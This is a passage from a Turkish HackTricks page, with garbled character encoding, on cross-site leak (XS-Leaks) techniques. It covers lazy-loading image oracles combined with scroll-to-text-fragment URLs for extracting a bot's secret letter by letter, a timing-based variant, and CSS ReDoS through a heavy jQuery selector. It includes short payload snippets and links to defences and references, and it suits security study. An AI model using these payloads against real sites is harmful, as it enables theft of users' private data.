Ancak, herhangi bir nedenden dolayÄ± bunu **her karakter iÃ§in yapmalÄ±sÄ±nÄ±z** (belki iletiÅŸim Ã¶nbellek vuruÅŸu yoluyla ise) bu hileyi kullanabilirsiniz.

HTML'deki **GÃ¶rÃ¼ntÃ¼lerin** bir "**yÃ¼kleniyor**" Ã¶zniteliÄŸi vardÄ±r ve deÄŸeri "**tembel**" olabilir. Bu durumda, gÃ¶rÃ¼ntÃ¼ yalnÄ±zca gÃ¶rÃ¼ntÃ¼lendiÄŸinde yÃ¼klenecek ve sayfa yÃ¼klenirken deÄŸil:

```html
<img src=/something loading=lazy >
```

Bu nedenle yapabileceÄŸiniz ÅŸey, **web sayfasÄ±nÄ± sÄ±rrÄ±n Ã¶nÃ¼nde doldurmak iÃ§in Ã§ok sayÄ±da gereksiz karakter eklemektir** (Ã–rneÄŸin **binlerce "W"** gibi) veya **sÄ±rrÄ±n Ã¶nÃ¼ne** `<br><canvas height="1850px"></canvas><br>` gibi bir ÅŸey eklemektir.\
Sonra Ã¶rneÄŸin **enjeksiyonumuz bayraÄŸÄ±n Ã¶nÃ¼nde gÃ¶rÃ¼nÃ¼yorsa**, **resim yÃ¼klenecektir**, ancak bayrak **ardÄ±ndan gÃ¶rÃ¼nÃ¼yorsa**, bayrak + gereksiz karakterler **yÃ¼kleme iÅŸlemini engelleyecektir** (ne kadar gereksiz karakter yerleÅŸtireceÄŸinizi denemeniz gerekecektir). Bu, [**bu yazÄ±da**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) ne olduÄŸunu gÃ¶sterir.

BaÅŸka bir seÃ§enek, izin veriliyorsa **scroll-to-text-fragment**'i kullanmaktÄ±r:

#### Scroll-to-text-fragment

Ancak, **botun sayfaya eriÅŸmesini saÄŸlamak iÃ§in** ÅŸunun gibi bir ÅŸey kullanabilirsiniz:

```
#:~:text=SECR
```

Web sayfasÄ± ÅŸÃ¶yle olacak: **`https://victim.com/post.html#:~:text=SECR`**

Burada post.html saldÄ±rganÄ±n gereksiz karakterleri ve tembel yÃ¼kleme gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ iÃ§erir ve ardÄ±ndan botun sÄ±rrÄ± eklenir.

Bu metin, botun sayfadaki `SECR` metnini iÃ§eren herhangi bir metne eriÅŸmesini saÄŸlayacak. Ã‡Ã¼nkÃ¼ bu metin sÄ±r ve **gÃ¶rÃ¼ntÃ¼nÃ¼n hemen altÄ±nda** ve **gÃ¶rÃ¼ntÃ¼ yalnÄ±zca doÄŸru tahmin edilen sÄ±r olduÄŸunda yÃ¼klenecek**. Bu ÅŸekilde, sÄ±rrÄ± **harf harf dÄ±ÅŸarÄ± sÄ±zdÄ±rmak iÃ§in bir oracle** elde etmiÅŸ olacaksÄ±nÄ±z.

Bunu sÃ¶mÃ¼rmek iÃ§in bazÄ± kod Ã¶rnekleri: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### GÃ¶rÃ¼ntÃ¼ Tembel YÃ¼kleme Zaman TabanlÄ±

EÄŸer **harf harf tahmin etmek ve bunu Ã¶lÃ§mek** iÃ§in birkaÃ§ kez denemek mÃ¼mkÃ¼n deÄŸilse ve bu, gÃ¶rÃ¼ntÃ¼nÃ¼n yÃ¼klendiÄŸini saldÄ±rganÄ±n anlamasÄ±nÄ± saÄŸlayacak bir harici gÃ¶rÃ¼ntÃ¼ yÃ¼klemek mÃ¼mkÃ¼n deÄŸilse, baÅŸka bir seÃ§enek, **gÃ¶rÃ¼ntÃ¼nÃ¼n yÃ¼klendiÄŸini gÃ¶sterebilecek** bir harici gÃ¶rÃ¼ntÃ¼ yÃ¼klemek olabilir. EÄŸer gÃ¶rÃ¼ntÃ¼ yÃ¼klendiyse, tÃ¼m isteklerin yÃ¼klenmesi, gÃ¶rÃ¼ntÃ¼nÃ¼n yÃ¼klenmediÄŸi durumdan daha uzun sÃ¼recektir. Bu, [**bu yazÄ±nÄ±n Ã§Ã¶zÃ¼mÃ¼nde**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **kullanÄ±lan ÅŸeydir:**

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

EÄŸer `jQuery(location.hash)` kullanÄ±lÄ±yorsa, **bazÄ± HTML iÃ§eriÄŸinin varlÄ±ÄŸÄ±nÄ±** zamanlama yoluyla tespit etmek mÃ¼mkÃ¼ndÃ¼r, Ã§Ã¼nkÃ¼ eÄŸer seÃ§ici `main[id='site-main']` eÅŸleÅŸmiyorsa, geri kalan **seÃ§icileri kontrol etmesine gerek yoktur**:

```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```

### CSS Enjeksiyonu

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## Savunmalar

[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) adresinde Ã¶nerilen Ã¶nlemler bulunmaktadÄ±r ve her bÃ¶lÃ¼mde [https://xsleaks.dev/](https://xsleaks.dev/) adresinde daha fazla bilgi iÃ§in bakabilirsiniz.

## Referanslar

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>SÄ±fÄ±rdan Kahraman'a AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **ğŸ’¬** [**Discord grubuna**](https://discord.gg/hRep4RUj7f) **veya** [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n veya bizi Twitter ğŸ¦** [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
